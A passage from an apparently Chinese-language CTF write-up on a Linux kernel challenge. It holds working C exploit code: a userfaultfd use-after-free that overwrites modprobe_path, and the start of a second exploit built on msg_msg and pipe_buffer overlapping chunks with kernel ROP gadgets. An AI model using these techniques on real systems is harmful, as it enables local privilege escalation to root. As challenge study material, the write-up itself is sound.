class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv, <span class="type">char</span>** env)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> data[<span class="number">0x200</span>];</span><br><span class="line"></span><br><span class="line">    bind_core(<span class="number">0</span>);</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/dev/ksctf&quot;</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;open device failed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> note_fd = open(<span class="string">&quot;/sys/kernel/notes&quot;</span>, O_RDONLY);</span><br><span class="line">    read(note_fd, data, <span class="number">0x100</span>);</span><br><span class="line">    binary_dump(<span class="string">&quot;/sys/kernel/notes&quot;</span>, data, <span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;leak, &amp;data[<span class="number">0x84</span>], <span class="number">8</span>);</span><br><span class="line">    hexx(<span class="string">&quot;leak&quot;</span>, leak);</span><br><span class="line">    kernel_base = leak - <span class="number">0x19e1180</span>;</span><br><span class="line">    hexx(<span class="string">&quot;kernel_base&quot;</span>, kernel_base);</span><br><span class="line">    <span class="type">size_t</span> kernel_offset = kernel_base - <span class="number">0xffffffff81000000</span>;</span><br><span class="line">    hexx(<span class="string">&quot;kernel_offset&quot;</span>, kernel_offset);</span><br><span class="line"></span><br><span class="line">    modprobe_path += kernel_offset;</span><br><span class="line">    magic_gadget += kernel_offset;</span><br><span class="line">    hexx(<span class="string">&quot;modprobe_path&quot;</span>, modprobe_path);</span><br><span class="line">    hexx(<span class="string">&quot;magic_gadget&quot;</span>, magic_gadget);</span><br><span class="line"></span><br><span class="line">    vuln.msg = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">    <span class="built_in">memset</span>(vuln.msg, <span class="string">&#x27;\x00&#x27;</span>, <span class="number">0x30</span>);</span><br><span class="line">    </span><br><span class="line">    work_for_cpu_fn  = kernel_base + <span class="number">0x8c360</span>;</span><br><span class="line">    init_creds = kernel_base + <span class="number">0x1448cc0</span>;</span><br><span class="line">    commit_creds = kernel_base + <span class="number">0x97d00</span>;</span><br><span class="line">    swapgs_restore_regs_and_return_to_usermode += kernel_offset + <span class="number">35</span>;</span><br><span class="line">    hexx(<span class="string">&quot;commit_creds&quot;</span>, commit_creds);</span><br><span class="line">    hexx(<span class="string">&quot;work_for_cpu_fn&quot;</span>, work_for_cpu_fn);</span><br><span class="line">    hexx(<span class="string">&quot;swapgs_restore_regs_and_return_to_usermode&quot;</span>, swapgs_restore_regs_and_return_to_usermode);</span><br><span class="line"></span><br><span class="line">    pop_rdi = kernel_base + <span class="number">0xe031</span>;</span><br><span class="line">    add_rsp_188_pop_rbx_ret = kernel_base + <span class="number">0x9369cc</span>;</span><br><span class="line">    hexx(<span class="string">&quot;add_rsp_188_pop_rbx_ret&quot;</span>,add_rsp_188_pop_rbx_ret);</span><br><span class="line"></span><br><span class="line">    add();</span><br><span class="line">    fake_ops_addr = heap_addr - <span class="number">0x68</span>;</span><br><span class="line">    hexx(<span class="string">&quot;fake_ops_addr&quot;</span>, fake_ops_addr);</span><br><span class="line"></span><br><span class="line">    <span class="type">pthread_t</span> pwn;</span><br><span class="line">    <span class="type">char</span> *uffd_buf_hijack = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    register_userfaultfd(uffd_buf_hijack, &amp;pwn, hijack_handler);</span><br><span class="line"></span><br><span class="line">    write(fd,uffd_buf_hijack,<span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line">    ioctl(tty_fd, <span class="number">0x68732f706d742f</span>, modprobe_path - <span class="number">8</span>);</span><br><span class="line">    ioctl(tty_fd, <span class="number">0x68732f</span>, modprobe_path - <span class="number">4</span>);</span><br><span class="line">    get_flag();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] EXP END.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="求解效果"><a href="#求解效果" class="headerlink" title="求解效果"></a>求解效果</h3><img src="/2024/10/07/kno_puts/5.png" class="" title="我的图图呢">  <h2 id="userfaultfd-msg-msg-pipe-buffer"><a href="#userfaultfd-msg-msg-pipe-buffer" class="headerlink" title="userfaultfd + msg_msg + pipe_buffer"></a>userfaultfd + msg_msg + pipe_buffer</h2><h3 id="思路分析-2"><a href="#思路分析-2" class="headerlink" title="思路分析"></a>思路分析</h3><p>现在我们在上面的情况中加点限制，即 <code>/sys/kernel/notes</code> 里面不再给我们提供内核地址，那我们能否继续获取内核的地址呢？答案是可以的，这里需要 <code>msg_msg</code> 和 <code>pipe_buffer</code> 两个结构体来相互协作，因为他们都可以让堆管理器取出 <code>0x400</code> 大小的 <code>objcet</code>。可能有的师傅会问我这里为什么不能使用 <code>tty_struct</code>，这里我后面会进行解释。</p><p>通过调试我们可以发现内核并没有开启 <code>CONFIG_SLAB_HARDENED=y</code> 选项，可就是说我们堆块的布局可预测。当然如果开启了我们也可以通过堆喷来达到我们想要的效果。我们可以相邻的布局一个 <code>msg_msg</code> 结构体 和一个 <code>pipe_buffer</code> 数组，然后通过 <code>uaf</code> 来将 msg_msg.m_ts 来改大，同时将 msg_msgseg *next 指向 <code>msg_msg +0x300</code> 的位置（后面解释），这个时候就可以实现结构体的越界读。同时 <code>msg_msg</code> 结构体的下方有个 <code>pipe_buffer</code> 数组，可以通过该结构的 <code>ops</code> 来获取到内核的地址。此时的堆布局如下：</p><img src="/2024/10/07/kno_puts/6.png" class="" title="我的图图呢">  <p>当我们调用 <code>msgrcv</code> 来读取 <code>msg_msg</code> 中的内容时，内核会调用 <code>free_msg</code> 遍历 <code>next</code> 依次释放 <code>msg_send</code> 并最终释放 <code>msg_msg</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">free_msg</span><span class="params">(<span class="keyword">struct</span> msg_msg *msg)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">seg</span>;</span></span><br><span class="line"></span><br><span class="line">security_msg_msg_free(msg);</span><br><span class="line"></span><br><span class="line">seg = msg-&gt;next;</span><br><span class="line">kfree(msg);</span><br><span class="line"><span class="keyword">while</span> (seg != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">tmp</span> =</span> seg-&gt;next;</span><br><span class="line"></span><br><span class="line">cond_resched();</span><br><span class="line">kfree(seg);</span><br><span class="line">seg = tmp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其遍历的终止条件为 <code>next</code> 指针为空。由于我们 <code>msg_msg</code> 的 <code>next</code> 指针指向 <code>msg_msg + 0x300</code> 的位置（注意，这个位置必须为空，这是为了终止 <code>free_msg</code> 对 <code>next</code> 指针的遍历），所以当我们读取 <code>msg_msg</code> 的数据泄露内核地址后 <code>msg_msg + 0x300</code> 会被当成一个堆块进行释放，最终堆的布局会变成下面这种情况：</p><img src="/2024/10/07/kno_puts/7.png" class="" title="我的图图呢">  <p>可以看见出现了叠堆，也就是说我们可以再次申请 <code>0x400</code> 的 <code>object</code> 就能修改到下方的 <code>pipe_buffer</code>。接下来就是一条龙服务了，修改 <code>ops</code> 然后两次栈迁移打 <code>kernel rop</code>。这里我为什么没用 <code>tty_struct</code> 呢？因为当我使用 <code>tty_struct</code> 时，我叠堆修改 <code>tty_struct</code> 时前 <code>8</code> 字节必须为空，否则就会 <code>kernel panice</code>，可是改 <code>pipe_buffer</code> 时前 <code>8</code> 字节确可以有数据。我们都知道，<code>tty_struct</code> 前 <code>8</code> 字节是魔术字 <code>0x100005401</code>，如果改字段损坏 <code>tty_struct</code> 就不会执行他虚表上的函数，也就是说我们无法控制程序流。所以到底为什么会 <code>panic</code>😇，如果有师傅知道原因可以加笔者微信或 QQ 教教鼠鼠😭</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// musl-gcc exp.c --static -masm=intel -lpthread -idirafter /usr/include/ -idirafter /usr/include/x86_64-linux-gnu/ -o exp</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/keyctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/utsname.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/resource.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/ldt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/if_packet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> modprobe_path = <span class="number">0xffffffff824493c0</span>;</span><br><span class="line"><span class="type">size_t</span> heap_addr = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> work_for_cpu_fn = <span class="number">0xffffffff810bd960</span>;</span><br><span class="line"><span class="type">size_t</span> init_creds = <span class="number">0xffffffff82c6b920</span>;</span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0xffffffff810ce710</span>;</span><br><span class="line"><span class="type">size_t</span> orignal[<span class="number">0x30</span>];</span><br><span class="line"><span class="type">size_t</span> leak, kernel_base;</span><br><span class="line"><span class="type">size_t</span> magic_gadget = <span class="number">0xffffffff81599a34</span>;</span><br><span class="line"><span class="comment">// 0xffffffff81599a34: push rsi; pop rsp; setl al; shl eax, 2; ret;</span></span><br><span class="line"><span class="type">size_t</span> add_rsp = <span class="number">0xffffffff81371a49</span>;</span><br><span class="line"><span class="comment">// 0xffffffff81371a49: add rsp, 8; pop rbx; pop r12; pop rbp; ret;</span></span><br><span class="line"><span class="type">size_t</span> pop_rdi;</span><br><span class="line"><span class="type">size_t</span> add_rsp_188_pop_rbx_ret;</span><br><span class="line"><span class="type">size_t</span> swapgs_restore_regs_and_return_to_usermode = <span class="number">0xffffffff81c00a74</span>;</span><br><span class="line"><span class="type">size_t</span> ptr = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> msg_qid;</span><br><span class="line"><span class="type">int</span> tty_fd;</span><br><span class="line"><span class="type">char</span> msg_buf[<span class="number">0x1000</span>];</span><br><span class="line"><span class="type">int</span> pipe_fd[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    <span class="type">char</span> *msg;</span><br><span class="line">    <span class="type">uint64_t</span> a;</span><br><span class="line">    <span class="type">uint64_t</span> b;</span><br><span class="line">    <span class="type">uint64_t</span> c;</span><br><span class="line">    <span class="type">uint64_t</span> d;</span><br><span class="line">    <span class="type">uint64_t</span> e;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> <span class="title">vuln</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">info</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[+] %s\n\033[0m&quot;</span>, msg);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">hexx</span><span class="params">(<span class="type">char</span> *msg, <span class="type">size_t</span> value)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s: %#lx\n\033[0m&quot;</span>, msg, value);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">binary_dump</span><span class="params">(<span class="type">char</span> *desc, <span class="type">void</span> *addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> *buf64 = (<span class="type">uint64_t</span> *) addr;</span><br><span class="line">    <span class="type">uint8_t</span> *buf8 = (<span class="type">uint8_t</span> *) addr;</span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[33m[*] %s:\n\033[0m&quot;</span>, desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %04x&quot;</span>, i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            i + j &lt; len / <span class="number">8</span> ? <span class="built_in">printf</span>(<span class="string">&quot; 0x%016lx&quot;</span>, buf64[i + j]) : <span class="built_in">printf</span>(<span class="string">&quot;                   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span> &amp;&amp; j + i * <span class="number">8</span> &lt; len; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf8[i * <span class="number">8</span> + j]) ? buf8[i * <span class="number">8</span> + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* bind the process to specific core */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_core</span><span class="params">(<span class="type">int</span> core)</span>&#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Process binded to core \033[0m%d\n&quot;</span>, core);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> &#123;</span></span><br><span class="line">    <span class="type">uint64_t</span>    next;</span><br><span class="line">    <span class="type">uint64_t</span>    prev;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">    <span class="type">uint64_t</span>    m_type;</span><br><span class="line">    <span class="type">uint64_t</span>    m_ts;</span><br><span class="line">    <span class="type">uint64_t</span>    next;</span><br><span class="line">    <span class="type">uint64_t</span>    security;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> &#123;</span></span><br><span class="line">    <span class="type">uint64_t</span>    next;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">getMsgQueue</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">readMsg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> msgrcv(msqid, msgp, msgsz, msgtyp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * the msgp should be a pointer to the `struct msgbuf`,</span></span><br><span class="line"><span class="comment"> * and the data should be stored in msgbuf.mtext</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">writeMsg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span>&#123;</span><br><span class="line">    ((<span class="keyword">struct</span> msgbuf*)msgp)-&gt;mtype = msgtyp;</span><br><span class="line">    <span class="keyword">return</span> msgsnd(msqid, msgp, 